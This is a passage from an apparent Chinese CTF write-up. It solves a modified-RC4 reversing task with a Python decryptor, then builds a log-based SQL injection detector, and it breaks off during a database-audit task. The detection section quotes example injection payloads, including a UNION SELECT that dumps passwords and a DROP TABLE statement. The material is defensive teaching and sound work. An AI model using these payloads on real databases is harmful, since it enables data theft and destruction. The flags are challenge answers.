v20 = <span class="hljs-string">&quot;Incorrect flag. Try again!\n&quot;</span>;<br>    sub_140001010(v20);<br>    sub_140004C04(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要加密函数为 sub_140001070，RC4 加密，但不是标准的，还有位运算异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __fastcall <span class="hljs-title function_">sub_140001070</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, _BYTE *a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// r11d</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// r8d</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">char</span> v11; <span class="hljs-comment">// di</span><br>  <span class="hljs-type">char</span> *v12; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// esi</span><br>  __int64 v17; <span class="hljs-comment">// rbp</span><br>  _BYTE *v18; <span class="hljs-comment">// rdi</span><br>  __int64 v19; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">int</span> v20; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">char</span> v21; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">char</span> *v22; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-118h] BYREF</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v7 = v23;<br>  <span class="hljs-keyword">do</span><br>    *v7++ = v5++;<br>  <span class="hljs-keyword">while</span> ( v5 &lt; <span class="hljs-number">256</span> );<br>  v8 = <span class="hljs-number">0</span>;<br>  v9 = v23;<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v11 = *v9;<br>    v8 = (<span class="hljs-type">int</span>)(v8 + (<span class="hljs-type">unsigned</span> __int8)*v9 - <span class="hljs-number">7</span> * (v10 / <span class="hljs-number">7u</span>) + v10 + <span class="hljs-number">4919</span>) % <span class="hljs-number">256</span>;<br>    v12 = &amp;v23[v8];<br>    ++v10;<br>    result = *v12;<br>    *v9++ = *v12;<br>    *v12 = v11;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v10 &lt; <span class="hljs-number">256</span> );<br>  v14 = <span class="hljs-number">0</span>;<br>  v15 = <span class="hljs-number">0</span>;<br>  v16 = <span class="hljs-number">0</span>;<br>  v17 = a2;<br>  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v18 = a3;<br>    v19 = a1 - (_QWORD)a3;<br>    v16 = a2;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v14 = (v14 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>      <span class="hljs-keyword">if</span> ( v14 == <span class="hljs-number">3</span> * (v14 / <span class="hljs-number">3</span>) )<br>        v20 = (<span class="hljs-type">unsigned</span> __int8)v23[<span class="hljs-number">3</span> * v14 % <span class="hljs-number">256</span>] + v15;<br>      <span class="hljs-keyword">else</span><br>        v20 = (<span class="hljs-type">unsigned</span> __int8)v23[v14] + v15;<br>      v15 = v20 % <span class="hljs-number">256</span>;<br>      v21 = v23[v14];<br>      v22 = &amp;v23[v15];<br>      v23[v14] = *v22;<br>      *v22 = v21;<br>      result = v14 * v15 % <span class="hljs-number">16</span>;<br>      *v18 = __ROL1__(result + (v18[v19] ^ v23[(<span class="hljs-type">unsigned</span> __int8)(v21 + v23[v14])]), <span class="hljs-number">3</span>);<br>      ++v18;<br>      --v17;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v17 );<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v16 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      result = *a3 ^ <span class="hljs-number">0x42</span>;<br>      *a3 = result;<br>      <span class="hljs-keyword">if</span> ( v3 )<br>      &#123;<br>        result ^= *(a3 - <span class="hljs-number">1</span>);<br>        *a3 = result;<br>      &#125;<br>      ++v3;<br>      ++a3;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v3 &lt; v16 );<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 word_14001D658 中拿到字符</p><p><img src="https://img.dkdun.cn/v1/2025/12/719c290cd24ed534.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x93</span>, <span class="hljs-number">0</span>xF9, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x92, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>xD9, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>xC6, <span class="hljs-number">0</span>x0A, <span class="hljs-number">0</span>x50, <span class="hljs-number">0</span>xC7, <span class="hljs-number">0</span>xDB, <span class="hljs-number">0</span>x4F, <span class="hljs-number">0</span>xCB, <span class="hljs-number">0</span>xD8, <span class="hljs-number">0</span>x5D, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>xB9, <span class="hljs-number">0</span>x40, <span class="hljs-number">0</span>x95, <span class="hljs-number">0</span>x70, <span class="hljs-number">0</span>xE7, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x37, <span class="hljs-number">0</span>x72, <span class="hljs-number">0</span>x4D, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x57<br></code></pre></td></tr></table></figure><p>脚本逆向解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><br>ida_chars = [<br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x50</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x40</span>,<br>    <span class="hljs-number">0x95</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x57</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">val, r_bits, max_bits=<span class="hljs-number">8</span></span>):<br>    <span class="hljs-keyword">return</span> ((val &lt;&lt; r_bits) &amp; (<span class="hljs-number">2</span>**max_bits - <span class="hljs-number">1</span>)) | (val &gt;&gt; (max_bits - r_bits))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">val, r_bits, max_bits=<span class="hljs-number">8</span></span>):<br>    <span class="hljs-keyword">return</span> ((val &gt;&gt; r_bits) | (val &lt;&lt; (max_bits - r_bits))) &amp; (<span class="hljs-number">2</span>**max_bits - <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_final_stage</span>(<span class="hljs-params">enc: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>    <span class="hljs-comment"># 逆转最后的异或链</span><br>    tmp = enc[:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        tmp[i] ^= tmp[i-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>        tmp[i] ^= <span class="hljs-number">0x42</span><br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_sbox</span>():<br>    sbox = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        v8 = (v8 + sbox[i] - <span class="hljs-number">7</span> * (i // <span class="hljs-number">7</span>) + i + <span class="hljs-number">4919</span>) % <span class="hljs-number">256</span><br>        sbox[i], sbox[v8] = sbox[v8], sbox[i]<br>    <span class="hljs-keyword">return</span> sbox<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rc4_variant</span>(<span class="hljs-params">enc_bytes: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>    sbox = init_sbox()<br>    v14 = <span class="hljs-number">0</span><br>    v15 = <span class="hljs-number">0</span><br>    data_len = <span class="hljs-built_in">len</span>(enc_bytes)<br>    plain = [<span class="hljs-number">0</span>] * data_len<br><br>    <span class="hljs-comment"># 逆向PRGA + 位运算逆</span><br>    <span class="hljs-comment"># 逐字节逆推明文： </span><br>    <span class="hljs-comment"># val = ROL3((v14 * v15 % 16 + (plain[i] ^ keystream))) </span><br>    <span class="hljs-comment"># 现已知 val = enc_bytes[i]</span><br>    <span class="hljs-comment"># 先逆ROL3 -&gt; ror3</span><br>    <span class="hljs-comment"># 则: val&#x27; = (v14 * v15 % 16 + (plain[i] ^ keystream)) &amp; 0xFF = ror3(enc_bytes[i])</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_len):<br>        v14 = (v14 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> v14 % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>            v20 = (sbox[(<span class="hljs-number">3</span> * v14) % <span class="hljs-number">256</span>] + v15) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">else</span>:<br>            v20 = (sbox[v14] + v15) % <span class="hljs-number">256</span><br>        v15 = v20<br>        v21 = sbox[v14]<br>        sbox[v14], sbox[v15] = sbox[v15], sbox[v14]<br>        keystream = sbox[(v21 + sbox[v14]) % <span class="hljs-number">256</span>]<br><br>        val = ror(enc_bytes[i], <span class="hljs-number">3</span>)  <span class="hljs-comment"># 逆向左旋3位</span><br>        <span class="hljs-comment"># val = (v14 * v15 % 16 + (plain[i] ^ keystream)) &amp; 0xFF</span><br><br>        <span class="hljs-comment"># 计算 (plain[i] ^ keystream) = val - (v14 * v15 % 16)</span><br>        sub = (v14 * v15) % <span class="hljs-number">16</span><br>        val_sub = (val - sub) &amp; <span class="hljs-number">0xFF</span><br>        plain[i] = val_sub ^ keystream<br><br>    <span class="hljs-keyword">return</span> plain<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    stage1 = reverse_final_stage(ida_chars)<br>    plaintext = decrypt_rc4_variant(stage1)<br><br>    <span class="hljs-comment"># 输出结果为 bytes，尝试打印ascii</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted plaintext (ascii):&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> plaintext))<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Non-printable characters detected, hex output:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;c:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> plaintext))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">flag&#123;Th1s_1s_<span class="hljs-built_in">A_Fl4w3d</span>_Crypt0&#125;<br></code></pre></td></tr></table></figure><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="SQLi-Detection"><a href="#SQLi-Detection" class="headerlink" title="SQLi_Detection"></a>SQLi_Detection</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">检测三种核心的<span class="hljs-keyword">SQL</span>注入模式：<br><br>检测规则<br>情况<span class="hljs-number">1</span>：布尔注入<br><br>模式：<span class="hljs-string">&#x27; OR 或 &#x27;</span> <span class="hljs-keyword">AND</span><br>示例：<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; --</span><br><span class="hljs-string">原理：通过OR/AND条件绕过身份验证</span><br><span class="hljs-string">情况2：联合查询注入</span><br><span class="hljs-string"></span><br><span class="hljs-string">模式：&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><br>示例：<span class="hljs-string">&#x27; UNION SELECT username,password FROM users --</span><br><span class="hljs-string">原理：通过UNION联合查询获取额外数据</span><br><span class="hljs-string">情况3：堆叠查询注入</span><br><span class="hljs-string"></span><br><span class="hljs-string">模式：&#x27;</span>; 危险语句<br>示例：<span class="hljs-string">&#x27;; DROP TABLE users; --</span><br><span class="hljs-string">原理：通过分号执行多个SQL语句</span><br><span class="hljs-string">判定逻辑</span><br><span class="hljs-string">满足以上任一模式即判定为SQL注入攻击。</span><br><span class="hljs-string"></span><br><span class="hljs-string">任务：统计 logs.txt 中疑似 SQL 注入的行数，flag格式：flag&#123;行数&#125;。</span><br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">count_sql_injection_logs</span>(<span class="hljs-params">log_file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    分析日志文件，根据预设的三种核心SQL注入模式统计疑似攻击的行数。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        log_file_path (str): 日志文件的路径。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        int: 疑似SQL注入攻击的日志行数。</span><br><span class="hljs-string">             如果文件未找到，则返回 -1。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    suspicious_lines_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 检查文件是否存在</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(log_file_path):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 日志文件 &#x27;<span class="hljs-subst">&#123;log_file_path&#125;</span>&#x27; 不存在。&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                <span class="hljs-comment"># 为了不区分大小写，将整行转换为小写进行匹配</span><br>                processed_line = line.lower()<br><br>                <span class="hljs-comment"># 规则1：检测布尔注入 (&#x27; or &#x27; 或 &#x27; and &#x27;)</span><br>                <span class="hljs-comment"># 使用 &#x27; or &#x27; 和 &#x27; and &#x27; (带空格) 来避免匹配到单词如 &#x27;error&#x27; 或 &#x27;android&#x27;</span><br>                is_boolean_injection = <span class="hljs-string">&quot;&#x27; or &quot;</span> <span class="hljs-keyword">in</span> processed_line <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#x27; and &quot;</span> <span class="hljs-keyword">in</span> processed_line<br><br>                <span class="hljs-comment"># 规则2：检测联合查询注入 (&#x27; union select)</span><br>                is_union_injection = <span class="hljs-string">&quot;&#x27; union select&quot;</span> <span class="hljs-keyword">in</span> processed_line<br><br>                <span class="hljs-comment"># 规则3：检测堆叠查询注入 (&#x27;;)</span><br>                is_stacked_injection = <span class="hljs-string">&quot;&#x27;;&quot;</span> <span class="hljs-keyword">in</span> processed_line<br><br>                <span class="hljs-comment"># 判定逻辑：满足任一模式即判定为SQL注入攻击</span><br>                <span class="hljs-keyword">if</span> is_boolean_injection <span class="hljs-keyword">or</span> is_union_injection <span class="hljs-keyword">or</span> is_stacked_injection:<br>                    suspicious_lines_count += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;读取文件时发生错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> suspicious_lines_count<br><br><br><span class="hljs-comment"># --- 主程序 ---</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    log_file = <span class="hljs-string">&#x27;logs.txt&#x27;</span><br><br>    <span class="hljs-comment"># 执行检测并获取行数</span><br>    count = count_sql_injection_logs(log_file)<br><br>    <span class="hljs-comment"># 如果函数成功执行（返回值不为-1），则打印flag</span><br>    <span class="hljs-keyword">if</span> count != -<span class="hljs-number">1</span>:<br>        flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;count&#125;</span>&#125;&#125;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;检测完成。&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发现疑似 SQL 注入的行数: <span class="hljs-subst">&#123;count&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成的 Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">451</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="DB-Log"><a href="#DB-Log" class="headerlink" title="DB_Log"></a>DB_Log</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs subunit">题目描述<br>本题目模拟企业数据库安全审计场景，需要分析数据库操作日志，检测违反企业安全政策的异常行为。系统包含4个部门（HR、Finance、IT、Sales）的权限管理，每个部门只能访问特定的数据表。<br><br>企业权限架构<br>部门数据表分布：<br><br>HR部门：employee_info、salary_data、personal_info<br>Finance部门：financial_reports、budget_data、payment_records<br>IT部门：system_logs、server_data、network_config<br>Sales部门：customer_data、sales_records、product_info<br>敏感字段：salary、ssn、phone、email、address<br><br>检测规则<br>规则1：跨部门数据访问违规<br>检测用户访问非本部门的数据表<br><br>规则2：敏感字段访问违规<br>检测用户访问个人隐私信息字段<br><br>规则3：工作时间外操作异常<br>检测在非工作时间（凌晨0<span class="hljs-string">-5</span>点）进行的数据库操作<br><br>规则4：数据备份异常操作<br>检测非授权用户执行数据备份操作（只有管理员可以执行BACKUP）<br><br>任务要求<br>分析提供的数据库操作日志，按照上述4个检测规则识别违规行为，输出违规记录的编号-日志ID格式，并计算MD5值。<br><br>输出格式：<br><br>违规记录: 规则编号-日志ID,规则编号-日志ID,...<br>排列顺序按照日志ID顺序<br>flag格式：flag&#123;MD5(规则编号-日志ID,规则编号-日志ID,...)&#125;<br><br><br>示例：<br>违规记录: 3<span class="hljs-string">-884</span>,4<span class="hljs-string">-1036</span>,2<span class="hljs-string">-1120</span>,2<span class="hljs-string">-1214</span>,1<span class="hljs-string">-1437</span>,2<span class="hljs-string">-1553</span>,3<span class="hljs-string">-1580</span>,3<span class="hljs-string">-1794</span><br>flag&#123;md5(3<span class="hljs-string">-884</span>,4<span class="hljs-string">-1036</span>,2<span class="hljs-string">-1120</span>,2<span class="hljs-string">-1214</span>,1<span class="hljs-string">-1437</span>,2<span class="hljs-string">-1553</span>,3<span class="hljs-string">-1580</span>,3<span class="hljs-string">-1794</span>)&#125;<br>flag&#123;0270383124549df3bdf631ff83e7ccb5&#125;<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 